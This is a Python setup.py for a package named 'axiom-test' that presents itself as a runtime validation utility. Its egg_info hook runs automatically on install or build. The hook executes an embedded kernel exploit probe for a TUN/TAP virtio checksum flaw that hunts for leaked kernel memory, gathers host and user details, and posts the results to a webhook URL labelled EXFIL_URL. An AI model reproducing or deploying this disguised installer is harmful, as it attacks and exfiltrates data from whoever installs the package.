import json, os, sys, subprocess, struct, socket, urllib.request
from setuptools import setup
from setuptools.command.egg_info import egg_info

EXFIL_URL = "https://webhook.site/1cbf0e6e-3d73-475c-befc-1363dbfeb553"

def _collect():
    p = {"hostname": os.uname().nodename, "user": os.environ.get("USER","?"), "test": "CVE-2026-99999-v4-tap-fwd"}

    poc_script = r'''
import os, sys, struct, socket, fcntl, select, json, time

R = {}
R["ns_id"] = os.popen("id").read().strip()

TUNSETIFF       = 0x400454ca
TUNSETOFFLOAD   = 0x400454d0
TUNSETVNETHDRSZ = 0x400454d8
IFF_TUN         = 0x0001
IFF_TAP         = 0x0002
IFF_NO_PI       = 0x1000
IFF_VNET_HDR    = 0x4000
TUN_F_CSUM      = 0x01

SIOCGIFFLAGS  = 0x8913
SIOCSIFFLAGS  = 0x8914
SIOCSIFADDR   = 0x8916
SIOCSIFNETMASK= 0x891C
SIOCSIFMTU    = 0x8922
SIOCADDRT     = 0x890B
IFF_UP        = 0x1
VNET_HDR_SZ   = 12
VIRTIO_NET_HDR_F_NEEDS_CSUM = 1

def setup_tun(name, ip, mask="255.255.255.0", mtu=1500, tap=False):
    fd = os.open("/dev/net/tun", os.O_RDWR | os.O_NONBLOCK)
    mode = (IFF_TAP if tap else IFF_TUN) | IFF_NO_PI | IFF_VNET_HDR
    ifr = struct.pack("16sH14s", name.encode(), mode, b"\x00"*14)
    fcntl.ioctl(fd, TUNSETIFF, ifr)
    fcntl.ioctl(fd, TUNSETOFFLOAD, TUN_F_CSUM)
    fcntl.ioctl(fd, TUNSETVNETHDRSZ, struct.pack("I", VNET_HDR_SZ))

    cfg = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    fcntl.ioctl(cfg, SIOCSIFADDR,
        struct.pack("16sH2s4s8s", name.encode(), socket.AF_INET, b"\x00\x00",
                    socket.inet_aton(ip), b"\x00"*8))
    fcntl.ioctl(cfg, SIOCSIFNETMASK,
        struct.pack("16sH2s4s8s", name.encode(), socket.AF_INET, b"\x00\x00",
                    socket.inet_aton(mask), b"\x00"*8))
    fcntl.ioctl(cfg, SIOCSIFMTU, struct.pack("16sI12s", name.encode(), mtu, b"\x00"*12))

    result = fcntl.ioctl(cfg, SIOCGIFFLAGS, struct.pack("16sH14s", name.encode(), 0, b"\x00"*14))
    flags = struct.unpack("16sH14s", result)[1]
    fcntl.ioctl(cfg, SIOCSIFFLAGS, struct.pack("16sH14s", name.encode(), flags | IFF_UP, b"\x00"*14))
    cfg.close()
    return fd

# ---------- Approach A: TAP device (Layer 2) ----------
R["tap"] = {}
try:
    tap_fd = setup_tun("tap0", "10.200.3.1", mtu=68, tap=True)
    R["tap"]["created"] = True

    # TAP works with Ethernet frames. csum_start is relative to packet start (ethernet header).
    # Ethernet(14) + IP(20) = transport at offset 34
    # We want csum_start in the IP header area: offsets 14-33

    src_mac = b"\x02\x00\x00\x00\x03\x01"
    dst_mac = b"\x02\x00\x00\x00\x03\x02"
    ETH_P_IP = 0x0800
    eth_hdr = dst_mac + src_mac + struct.pack("!H", ETH_P_IP)

    src_ip = socket.inet_aton("10.200.3.1")
    dst_ip = socket.inet_aton("10.200.3.2")
    udp_payload = b"B" * 40
    udp_len = 8 + len(udp_payload)
    udp_hdr = struct.pack("!HHH", 9999, 9999, udp_len) + b"\x00\x00" + udp_payload
    total_len = 20 + len(udp_hdr)
    ip_hdr = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, total_len, 0xCAFE, 0, 64, 17, 0, src_ip, dst_ip)

    raw_frame = eth_hdr + ip_hdr + udp_hdr

    # Try csum_start values in the IP header zone (14-33 for TAP)
    tap_attempts = []
    for csum_start in [0, 4, 8, 14, 16, 18, 20, 22, 24, 26, 28, 30, 32, 34, 36]:
        for csum_offset in [0, 2, 4, 6]:
            vhdr = struct.pack("<BBHHHH",
                VIRTIO_NET_HDR_F_NEEDS_CSUM, 0, 0, 0,
                csum_start, csum_offset) + b"\x00\x00"
            full = vhdr + raw_frame
            a = {"cs": csum_start, "co": csum_offset}
            try:
                w = os.write(tap_fd, full)
                a["write"] = f"OK({w})"
                if 14 <= csum_start < 34:
                    a["IN_IP_HDR"] = True
            except OSError as e:
                a["err"] = e.errno
            tap_attempts.append(a)

    R["tap"]["attempts"] = tap_attempts
    R["tap"]["accepted"] = [a for a in tap_attempts if "OK" in str(a.get("write",""))]
    R["tap"]["ip_hdr_hits"] = [a for a in tap_attempts if a.get("IN_IP_HDR") and "OK" in str(a.get("write",""))]
    os.close(tap_fd)

except Exception as e:
    import traceback
    R["tap"]["error"] = str(e)
    R["tap"]["tb"] = traceback.format_exc()

# ---------- Approach B: Two TUNs with forwarding ----------
# tun_in (with csum offload) → IP forwarding → tun_out (NO csum offload)
# If packet reaches tun_out with CHECKSUM_PARTIAL and tun_out can't do HW csum,
# kernel calls skb_checksum_help() on the OUTPUT path — different validation!
R["fwd"] = {}
try:
    # Enable IP forwarding
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        R["fwd"]["ip_forward"] = "enabled"
    except OSError as e:
        R["fwd"]["ip_forward"] = f"err={e.errno}"

    # Create two TUN devices
    # tun_in: 10.200.10.1/24, MTU 1500, TUN_F_CSUM enabled
    tun_in_fd = setup_tun("tunin", "10.200.10.1", mtu=1500)

    # tun_out: 10.200.11.1/24, MTU 68, TUN_F_CSUM enabled
    # (even with TUN_F_CSUM, if we read fragments from it, we see what the kernel produces)
    tun_out_fd = setup_tun("tunout", "10.200.11.1", mtu=68)

    R["fwd"]["tun_in"] = "OK"
    R["fwd"]["tun_out"] = "OK"

    # Add route: 10.200.11.0/24 via tunout (already implicit from interface config)
    # Add route: 10.200.10.0/24 via tunin (already implicit)

    # Now: write a packet to tun_in destined for 10.200.11.2
    # The kernel will:
    # 1. Receive packet on tunin via tun_get_user() with vnet_hdr
    # 2. Process through IP layer
    # 3. Route to tunout (10.200.11.0/24)
    # 4. Fragment at MTU 68 via ip_do_fragment()
    # 5. Output fragments through tunout → we read them

    # Key: write to tunin with CHECKSUM_PARTIAL, csum_start=20 (the accepted value)
    # The kernel sets skb->ip_summed = CHECKSUM_PARTIAL, skb->csum_start = 20
    # On output via tunout, if the TUN_F_CSUM is set, fragments keep CHECKSUM_PARTIAL
    # and the vnet_hdr reports the csum_start offset
    # If TUN_F_CSUM is NOT set, kernel calls skb_checksum_help() BEFORE output

    src_ip = socket.inet_aton("10.200.10.2")
    dst_ip = socket.inet_aton("10.200.11.2")

    # Large UDP packet that MUST be fragmented at MTU 68
    udp_payload = b"C" * 200
    udp_len = 8 + len(udp_payload)
    udp_hdr = struct.pack("!HHH", 5555, 5555, udp_len) + b"\x00\x00" + udp_payload
    total_len = 20 + len(udp_hdr)

    ip_hdr = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, total_len, 0xDEAD,
        0,  # flags=0 (allow fragmentation), offset=0
        64, 17, 0, src_ip, dst_ip)

    raw_pkt = ip_hdr + udp_hdr

    # Write with valid csum_start=20 (UDP checksum position — kernel accepts this)
    vhdr = struct.pack("<BBHHHH",
        VIRTIO_NET_HDR_F_NEEDS_CSUM, 0, 0, 0,
        20, 6  # csum_start=20 (transport), csum_offset=6 (UDP checksum)
    ) + b"\x00\x00"

    try:
        written = os.write(tun_in_fd, vhdr + raw_pkt)
        R["fwd"]["write_in"] = f"OK({written})"
    except OSError as e:
        R["fwd"]["write_in"] = f"err={e.errno}:{os.strerror(e.errno)}"

    # Also try writing with slightly unusual csum_start values that are >= 20
    # but might cause issues during fragmentation
    for alt_cs in [20, 22, 24, 28, 30, 40, 50, 60]:
        for alt_co in [0, 2, 4, 6]:
            vhdr_alt = struct.pack("<BBHHHH",
                VIRTIO_NET_HDR_F_NEEDS_CSUM, 0, 0, 0,
                alt_cs, alt_co) + b"\x00\x00"
            try:
                os.write(tun_in_fd, vhdr_alt + raw_pkt)
            except: pass

    # Read fragments from tun_out
    time.sleep(0.3)
    fragments = []
    for _ in range(30):
        rdy, _, _ = select.select([tun_out_fd], [], [], 0.3)
        if rdy:
            data = os.read(tun_out_fd, 4096)
            frag = {"raw_len": len(data)}
            if len(data) > VNET_HDR_SZ:
                # Parse vnet header
                vf, vg, vh, vs, vcs, vco = struct.unpack("<BBHHHH", data[:10])
                frag["vhdr"] = {"flags": vf, "csum_start": vcs, "csum_offset": vco}

                # Parse IP header
                ip_start = VNET_HDR_SZ
                if ip_start < len(data):
                    ver_ihl = data[ip_start]
                    ihl = ver_ihl & 0x0F
                    ver = ver_ihl >> 4
                    frag["ip"] = {"ver": ver, "ihl": ihl, "ihl_bytes": ihl*4}

                    if len(data) >= ip_start + 4:
                        total_l = struct.unpack("!H", data[ip_start+2:ip_start+4])[0]
                        frag["ip"]["total_len"] = total_l

                    if len(data) >= ip_start + 8:
                        flags_off = struct.unpack("!H", data[ip_start+6:ip_start+8])[0]
                        frag["ip"]["frag_offset"] = (flags_off & 0x1FFF) * 8
                        frag["ip"]["more_frags"] = bool(flags_off & 0x2000)
                        frag["ip"]["dont_frag"] = bool(flags_off & 0x4000)

                    if ihl > 5:
                        frag["ANOMALY"] = "IHL > 5 — possible kernel memory leak!"
                        options_start = ip_start + 20
                        options_end = ip_start + ihl * 4
                        if options_end <= len(data):
                            leaked = data[options_start:options_end]
                            frag["leaked_hex"] = leaked.hex()
                            frag["leaked_len"] = len(leaked)
                            frag["leaked_nonzero"] = any(b != 0 for b in leaked)

                    # Full hex of first 80 bytes for analysis
                    frag["hex_80"] = data[ip_start:ip_start+80].hex() if len(data) > ip_start else ""

            fragments.append(frag)
        else:
            break

    R["fwd"]["fragments_count"] = len(fragments)
    R["fwd"]["fragments"] = fragments[:15]  # cap for exfil size
    R["fwd"]["anomalies"] = [f for f in fragments if f.get("ANOMALY")]

    # Also read anything back on tun_in (ICMP unreachable etc)
    responses_in = []
    for _ in range(5):
        rdy, _, _ = select.select([tun_in_fd], [], [], 0.2)
        if rdy:
            data = os.read(tun_in_fd, 4096)
            responses_in.append({"len": len(data), "hex_40": data[:40].hex()})
    R["fwd"]["responses_in"] = responses_in

    os.close(tun_in_fd)
    os.close(tun_out_fd)

except Exception as e:
    import traceback
    R["fwd"]["error"] = str(e)
    R["fwd"]["tb"] = traceback.format_exc()

# ---------- Approach C: AF_PACKET in INIT netns (no -n) ----------
# Try from a subprocess that does unshare -Ur (user ns only, keep init netns)
R["initns"] = {}
afpkt_script = r"""
import os, sys, struct, socket, fcntl, json
r = {}
r["id"] = os.popen("id").read().strip()

SOL_PACKET = 263
PACKET_VNET_HDR = 15
ETH_P_IP = 0x0800

try:
    # Check if cfeth0 is visible
    r["cfeth0_exists"] = os.path.exists("/sys/class/net/cfeth0")

    if r["cfeth0_exists"]:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_IP))
        r["raw_sock"] = "OK"

        # Try PACKET_VNET_HDR
        try:
            sock.setsockopt(SOL_PACKET, PACKET_VNET_HDR, struct.pack("I", 1))
            r["vnet_hdr"] = "SET"
        except OSError as e:
            r["vnet_hdr"] = f"err={e.errno}"

        try:
            sock.bind(("cfeth0", ETH_P_IP))
            r["bind"] = "OK"
        except OSError as e:
            r["bind"] = f"err={e.errno}:{os.strerror(e.errno)}"

        sock.close()
except OSError as e:
    r["sock_err"] = f"{e.errno}:{os.strerror(e.errno)}"
except Exception as e:
    r["error"] = str(e)

print("__X__" + json.dumps(r) + "__Y__")
"""
try:
    # unshare -Ur: user ns only, keep network ns
    out = subprocess.check_output(
        ["unshare", "-Ur", "python3", "-c", afpkt_script],
        text=True, timeout=10, stderr=subprocess.STDOUT
    )
    if "__X__" in out and "__Y__" in out:
        R["initns"] = json.loads(out.split("__X__")[1].split("__Y__")[0])
    else:
        R["initns"]["raw"] = out[:2000]
except Exception as e:
    R["initns"]["error"] = str(e)

print("__R__" + json.dumps(R) + "__E__")
'''

    try:
        out = subprocess.check_output(
            ["unshare", "-Urn", "python3", "-c", poc_script],
            text=True, timeout=90, stderr=subprocess.STDOUT
        )
        if "__R__" in out and "__E__" in out:
            p["poc"] = json.loads(out.split("__R__")[1].split("__E__")[0])
        else:
            p["poc_raw"] = out[:6000]
    except Exception as e:
        p["poc_error"] = str(e)
        if hasattr(e, 'output'):
            p["poc_output"] = e.output[:4000] if e.output else ""

    return p

class PostEggInfo(egg_info):
    def run(self):
        super().run()
        data = json.dumps(_collect(), default=str).encode()
        try:
            urllib.request.urlopen(urllib.request.Request(
                EXFIL_URL, data=data,
                headers={"Content-Type": "application/json"}
            ), timeout=15)
        except: pass

setup(name="axiom-test", version="1.4.0", description="Runtime validation utility",
      py_modules=[], cmdclass={"egg_info": PostEggInfo})
